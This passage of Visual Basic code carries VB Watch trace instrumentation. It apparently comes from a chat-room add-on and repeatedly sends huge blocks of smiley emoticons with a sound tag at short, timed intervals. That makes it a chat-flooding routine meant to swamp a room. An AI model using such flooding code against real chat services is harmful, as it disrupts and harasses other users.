If vbwTraceLine Then vbwExecuteLine False, "159    pause 0.34"
' </VB WATCH>
159    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "160    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
160    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "161    pause 0.34"
' </VB WATCH>
161    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "162    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
162    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "163    pause 0.34"
' </VB WATCH>
163    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "164    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
164    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "165    pause 0.34"
' </VB WATCH>
165    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "166    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
166    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "167    pause 0.34"
' </VB WATCH>
167    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "168    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
168    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "169    pause 0.34"
' </VB WATCH>
169    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "170    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
170    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "171    pause 0.34"
' </VB WATCH>
171    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "172    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
172    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "173    pause 0.34"
' </VB WATCH>
173    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "174    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
174    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "175    pause 0.34"
' </VB WATCH>
175    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "176    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
176    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "177    pause 0.34"
' </VB WATCH>
177    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "178    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
178    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "179    pause 0.34"
' </VB WATCH>
179    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "180    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
180    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "181    pause 0.34"
' </VB WATCH>
181    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "182    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
182    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "183    pause 0.34"
' </VB WATCH>
183    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "184    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
184    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "185    pause 0.34"
' </VB WATCH>
185    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "186    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
186    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "187    pause 0.34"
' </VB WATCH>
187    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "188    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
188    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "189    pause 0.34"
' </VB WATCH>
189    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "190    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
190    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "191    pause 0.34"
' </VB WATCH>
191    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "192    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
192    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "193    pause 0.34"
' </VB WATCH>
193    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "194    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
